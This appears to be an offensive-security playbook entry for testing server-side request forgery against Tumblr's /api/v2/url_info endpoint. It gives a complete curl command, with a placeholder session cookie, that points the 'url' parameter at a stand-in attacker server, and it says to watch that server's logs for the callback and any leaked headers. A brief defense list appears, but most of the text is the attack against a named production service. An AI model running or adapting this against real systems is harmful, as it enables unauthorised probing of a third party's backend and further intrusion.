---
id: proc-tumblr-external-ssrf-001
tags:
  - ssrf
  - external
  - callback
  - tumblr
type: procedure
tools:
  - '[[tools/Burp-Suite-Proxy]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-external-ssrf-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.734Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-External-SSRF-with-Attacker-Server

## Summary

This procedure modifies the intercepted /api/v2/url_info request to point to an external attacker-controlled server, confirming SSRF by verifying the request's arrival and source.

## Description

The vulnerability allows the 'url' parameter to fetch arbitrary external URLs without validation. By redirecting to a server under attacker control (e.g., using ngrok or a VPS), the SSRF can be observed directly. This reveals the backend's behavior and sets up for further probing. Prerequisites include hosting a simple HTTP listener on the external server.

## Requirements

1. External server with logging (e.g., Python HTTP server or webhook)
2. Intercepted request from previous procedure
3. Proxy tool for modification

## Defense

Defensive measures and detection strategies:

- Whitelist allowed domains for URL parameters in API endpoints
- Log and block requests to non-Tumblr URLs
- Use outbound firewall rules to restrict server-initiated connections

## Objectives

1. Confirm SSRF by receiving callback request
2. Capture headers and source details
3. Validate external reachability without authentication bypass

## Instructions

### Step 1: Modify URL Parameter

**Context**: Alter the 'url' in the intercepted request to your external endpoint.

Use proxy to edit: Set url=http://your-external-server.com/test.

**Command** ([[commands/curl-external-ssrf-test]]):
```bash
curl -X GET "https://www.tumblr.com/api/v2/url_info?url=http://your-external-server.com/test&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary" -H "Host: www.tumblr.com" -H "Cookie: your-session-cookie"
```

> Forwards modified request; monitor external server for incoming GET /test.

### Step 2: Observe Callback

**Context**: Check server logs for the SSRF-induced request.

No command; review access logs.

> Incoming request confirms SSRF; note User-Agent and any leaked headers.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-external-ssrf-test]]

## Tools Used

- [[tools/Burp-Suite-Proxy]]

## Tags

- ssrf
- external
- callback
- tumblr
